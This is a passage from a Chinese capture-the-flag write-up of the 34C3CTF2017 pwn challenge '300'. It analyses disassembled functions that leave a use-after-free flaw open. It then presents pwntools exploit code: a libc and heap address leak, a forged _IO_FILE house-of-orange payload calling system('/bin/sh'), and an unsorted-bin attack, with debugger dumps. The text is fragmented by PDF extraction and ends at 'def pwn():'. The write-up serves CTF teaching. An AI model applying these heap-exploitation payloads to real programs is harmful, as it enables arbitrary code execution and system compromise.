该函数固定分配 0x300 的空间，然后根据 slot 将返回地址放到从 0x202040 开始
的数组 allocs 中。
write
[0x00000790]> pdf @ sym.write_it
/ (fcn) sym.write_it 56
| sym.write_it ();
| ; var int local_4h @ rbp-0x4
| ; CALL XREF from 0x00000b17 (main)
| 0x000009fd push rbp
| 0x000009fe mov rbp, rsp
| 0x00000a01 sub rsp, 0x10
| 0x00000a05 mov dword [local_4h], edi
; slot 放到 [local_4h]
| 0x00000a08 mov eax, dword [local_4h]
| 0x00000a0b cdqe
| 0x00000a0d lea rdx, [rax*8]
| 0x00000a15 lea rax, obj.allocs
; 0x202040
| 0x00000a1c mov rax, qword [rdx + rax]
; 取出 allocs[slot]
| 0x00000a20 mov edx, 0x300
| 0x00000a25 mov rsi, rax
| 0x00000a28 mov edi, 0
| 0x00000a2d call sym.imp.read
; read(0, allocs[slot], 0x300) 读入字符串
| 0x00000a32 nop
| 0x00000a33 leave
\ 0x00000a34 ret
该函数读入最多 0x300 个字符到 slot 对应的空间中。没有在字符串末尾加
\x00 ，可能导致信息泄露。
print
1372
6.1.26 pwn 34C3CTF2017 300
[0x00000790]> pdf @ sym.print_it
/ (fcn) sym.print_it 46
| sym.print_it ();
| ; var int local_4h @ rbp-0x4
| ; CALL XREF from 0x00000b23 (main)
| 0x00000a35 push rbp
| 0x00000a36 mov rbp, rsp
| 0x00000a39 sub rsp, 0x10
| 0x00000a3d mov dword [local_4h], edi
; slot 放到 [local_4h]
| 0x00000a40 mov eax, dword [local_4h]
| 0x00000a43 cdqe
| 0x00000a45 lea rdx, [rax*8]
| 0x00000a4d lea rax, obj.allocs
; 0x202040
| 0x00000a54 mov rax, qword [rdx + rax]
; 取出 allocs[slot]
| 0x00000a58 mov rdi, rax
| 0x00000a5b call sym.myputs
; 打印
| 0x00000a60 nop
| 0x00000a61 leave
\ 0x00000a62 ret
该函数用于打印 slot 对应空间中的字符串。
free
1373
6.1.26 pwn 34C3CTF2017 300
[0x00000790]> pdf @ sym.free_it
/ (fcn) sym.free_it 46
| sym.free_it ();
| ; var int local_4h @ rbp-0x4
| ; CALL XREF from 0x00000b2f (main)
| 0x00000a63 push rbp
| 0x00000a64 mov rbp, rsp
| 0x00000a67 sub rsp, 0x10
| 0x00000a6b mov dword [local_4h], edi
; slot 放到 [local_4h]
| 0x00000a6e mov eax, dword [local_4h]
| 0x00000a71 cdqe
| 0x00000a73 lea rdx, [rax*8]
| 0x00000a7b lea rax, obj.allocs
; 0x202040
| 0x00000a82 mov rax, qword [rdx + rax]
; 取出 allocs[slot]
| 0x00000a86 mov rdi, rax
| 0x00000a89 call sym.imp.free
; free(allocs[slot]) 释放空间
| 0x00000a8e nop
| 0x00000a8f leave
\ 0x00000a90 ret
该函数用于释放 slot 对应的空间，但是却没有将 allocs[slot] 指针置空，导致
UAF，或者 double-free。
漏洞利用
从上面我们可以看到，程序的各项操作都基于 slot，对 allocs[slot] 指向的内存空间
进行操作，但没有对 allocs[slot] 是否为空，或者其指向的内存是否为被释放的状
态，都没有做任何检查，这也是之前发生段错误的原因。
leak
1374
6.1.26 pwn 34C3CTF2017 300
def leak():
global libc_base
global heap_addr
alloc(0)
alloc(1)
alloc(2)
alloc(3)
alloc(4)
free(1)
free(3)
printt(1)
libc_base = u64(io.recvn(6).ljust(8, '\x00')) - 0x3c1b58
printt(3)
heap_addr = u64(io.recvn(6).ljust(8, '\x00')) - 0x310
log.info("libc_base address: 0x%x" % libc_base)
log.info("heap address: 0x%x" % heap_addr)
首先利用 unsorted bin 可以泄露出 libc 和 heap 的地址。分配 5 个 chunk 的原因是
为了避免 \x00 截断（heap 基地址的低位 0x00 ）。然后释放掉 1 和 3 即可。
1375
6.1.26 pwn 34C3CTF2017 300
gef➤ x/10gx &allocs
0x555555756040 : 0x0000555555757010 0x000055555575
7320
0x555555756050 : 0x0000555555757630 0x000055555
5757940
0x555555756060 : 0x0000555555757c50 0x000000000
0000000
0x555555756070 : 0x0000000000000000 0x000000000
0000000
0x555555756080 : 0x0000000000000000 0x000000000
0000000
gef➤ x/6gx 0x0000555555757320-0x10
0x555555757310: 0x0000000000000000 0x0000000000000311 _IO_wr
ite_base
stream += p64(0xffffffff) # fp->_IO_wr
ite_ptr
stream += p64(bin_sh_addr) # fp->_IO_wr
ite_end # fp->wide_data->buf_base
stream = stream.ljust(0x74, '\x00')
stream += p64(0) # fp->_flags2
stream = stream.ljust(0xa0, '\x00')
stream += p64(fake_chunk) # fp->_wide_
data
stream = stream.ljust(0xc0, '\x00')
stream += p64(0) # fp->_mode
payload = "A" * 0x10
payload += stream
payload += p64(0) * 2
payload += p64(io_wstr_finish - 0x18) # _IO_FILE_p
lus->vtable - 0x8
payload += p64(0)
payload += p64(system_addr) # ((_IO_strf
ile *) fp)->_s._free_buffer
write(4, payload)
payload = p64(0) + p64(fake_chunk) # unsorted_b
in->TAIL->bk
write(1, payload)
alloc(5)
alloc(6) # put fake c
hunk in smallbins[5]
free(5) # put a chun
k in unsorted bin
1377
6.1.26 pwn 34C3CTF2017 300
write(5, p64(0) + p64(io_list_all - 0x10)) # bk pointer
alloc(5) # unsorted b
in attack
这一步就比较复杂了。因为程序只允许分配 0x300 大小的 chunk，而我们知道
house-of-orange 需要大小为 0x60 的 chunk（放入 smallbins[5]）。由于我们可以
具有修改 free chunk 的能力，所以可以修改 unsorted bin 里 chunk 的 bk 指针指向
伪造的 fake chunk，以将其链接到 unsorted bin 中。接下来的第一次 malloc 将修
改 unsorted_bin->TAIL->bk 将指向 fake chunk，而第二次 malloc 的时候，由于大
小不合适，fake chunk 就会被整理回 smallbins[5]：
gef➤ x/10gx &allocs
0x555555756040 : 0x0000555555757010 0x000055555575
7320
0x555555756050 : 0x0000555555757630 0x000055555
5757940
0x555555756060 : 0x0000555555757c50 0x000055555
5757320
0x555555756070 : 0x0000555555757940 0x000000000
0000000
0x555555756080 : 0x0000000000000000 0x000000000
0000000
gef➤ x/6gx 0x0000555555757320-0x10
0x555555757310: 0x0000000000000000 0x0000000000000311 _IO_write_ptr
0x555555757c90: 0x00007ffff7b9ac40 0x0000000000000000
1378
6.1.26 pwn 34C3CTF2017 300
wide_data->buf_base
0x555555757ca0: 0x0000000000000000 0x0000000000000000
0x555555757cb0: 0x0000000000000000 0x0000000000000000
0x555555757cc0: 0x0000000000000000 0x0000000000000000
0x555555757cd0: 0x0000000000000000 0x0000000000000000
0x555555757ce0: 0x0000000000000000 0x0000000000000000
0x555555757cf0: 0x0000000000000000 0x0000000000000000
0x555555757d00: 0x0000555555757c60 0x0000000000000000
_wide_data
0x555555757d10: 0x0000000000000000 0x0000000000000000
0x555555757d20: 0x0000000000000000 0x0000000000000000
_mode
0x555555757d30: 0x0000000000000000 0x00007ffff7dcdc78
_s._free_buffer
gef➤ x/12gx 0x7ffff7dd1bb8-0x50
0x7ffff7dd1b68: 0x00007ffff7dd1b58 0x00007ffff7dd1b58 _wide_data 指向了 fake chunk，所以就相当于我们复用了这
一块空间， fp->_IO_write_end 的地方也是就是 fp->wide_data-
>buf_base 。
接下来利用 unsorted bin attack 修改 _IO_list_all 指向 &unsorted_bin-
0x10 ，而偏移 0x60 的地方就是 _IO_list_all->_chain ，即 smallbins[5]，指
向了 fake chunk。
1379
6.1.26 pwn 34C3CTF2017 300
gef➤ x/10gx &allocs
0x555555756040 : 0x0000555555757010 0x000055555575
7320
0x555555756050 : 0x0000555555757630 0x000055555
5757940
0x555555756060 : 0x0000555555757c50 0x000055555
5757320
0x555555756070 : 0x0000555555757940 0x000000000
0000000
0x555555756080 : 0x0000000000000000 0x000000000
0000000
gef➤ x/6gx 0x0000555555757320-0x10
0x555555757310: 0x0000000000000000 0x0000000000000311 : 0x00007ffff7dd1b58 0x000000
0000000000
gef➤ x/14gx 0x00007ffff7dd1b58
0x7ffff7dd1b58: 0x0000555555757f50 0x0000000000000000 <--
&unsorted_bin-0x10
0x7ffff7dd1b68: 0x0000555555757310 0x00007ffff7dd24f0 <--
unsorted bin
0x7ffff7dd1b78: 0x00007ffff7dd1b68 0x00007ffff7dd1b68
0x7ffff7dd1b88: 0x00007ffff7dd1b78 0x00007ffff7dd1b78
0x7ffff7dd1b98: 0x00007ffff7dd1b88 0x00007ffff7dd1b88
0x7ffff7dd1ba8: 0x00007ffff7dd1b98 0x00007ffff7dd1b98
0x7ffff7dd1bb8: 0x0000555555757c60 0x0000555555757c60 <--
smallbins[5]
pwn
1380
6.1.26 pwn 34C3CTF2017 300
def pwn():